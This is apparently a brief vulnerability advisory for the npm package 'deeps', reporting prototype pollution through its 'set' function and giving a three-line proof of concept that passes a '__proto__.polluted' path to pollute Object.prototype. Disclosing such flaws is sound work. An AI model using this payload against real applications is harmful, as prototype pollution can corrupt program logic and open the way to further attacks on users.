# Overview

`deeps` is a Highly performant utilities to manage deeply nested objects. `get`, `set`, `merge`, `flatten`, `diff` etc.

This package are vulnerable to Prototype Pollution via. the `set` function.

```
const deeps = require('deeps');
deeps.set({}, '__proto__.polluted', true);
console.log(polluted);
```